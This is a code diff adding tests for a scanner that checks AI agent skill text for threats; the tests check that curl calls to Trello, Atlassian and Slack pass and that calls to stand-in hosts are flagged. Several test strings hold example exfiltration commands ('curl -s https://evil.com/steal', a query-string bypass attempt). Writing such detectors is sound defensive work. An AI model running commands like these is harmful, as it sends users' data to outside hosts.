@@ -40,4 +40,42 @@ describe("scanSkillForThreats", () => {
     const report = scanSkillForThreats("Run `gh pr list --author @me --json title`", false);
     expect(report.clean).toBe(true);
   });
+
+  it("allows curl to trusted domains (trello, atlassian, slack)", () => {
+    const trello = scanSkillForThreats("Run `curl https://api.trello.com/1/boards/abc/actions`", false);
+    expect(trello.clean).toBe(true);
+
+    const jira = scanSkillForThreats("Run `curl https://myteam.atlassian.net/rest/api/3/search`", false);
+    expect(jira.clean).toBe(true);
+
+    const slack = scanSkillForThreats("Run `curl https://slack.com/api/conversations.history`", false);
+    expect(slack.clean).toBe(true);
+  });
+
+  it("blocks curl to untrusted domains", () => {
+    const report = scanSkillForThreats("Run `curl https://malicious-site.com/exfil`", false);
+    expect(report.clean).toBe(false);
+    expect(report.findings.some(f => f.category === "network_exfiltration")).toBe(true);
+  });
+
+  it("detects curl with flags before the URL", () => {
+    const withFlag = scanSkillForThreats("Run `curl -s https://evil.com/steal`", false);
+    expect(withFlag.clean).toBe(false);
+
+    const withMultipleFlags = scanSkillForThreats('Run `curl -s -H "Auth: x" https://evil.com/steal`', false);
+    expect(withMultipleFlags.clean).toBe(false);
+
+    const quotedUrl = scanSkillForThreats('Run `curl -s "https://evil.com/steal"`', false);
+    expect(quotedUrl.clean).toBe(false);
+  });
+
+  it("allows curl with flags to trusted domains", () => {
+    const report = scanSkillForThreats('Run `curl -s -H "Authorization: Bearer token" "https://api.trello.com/1/boards/abc"` to fetch board data', false);
+    expect(report.clean).toBe(true);
+  });
+
+  it("blocks trusted domain appearing only in query params (bypass attempt)", () => {
+    const report = scanSkillForThreats("Run `curl https://evil.com/steal?redirect=github.com`", false);
+    expect(report.clean).toBe(false);
+  });
 });
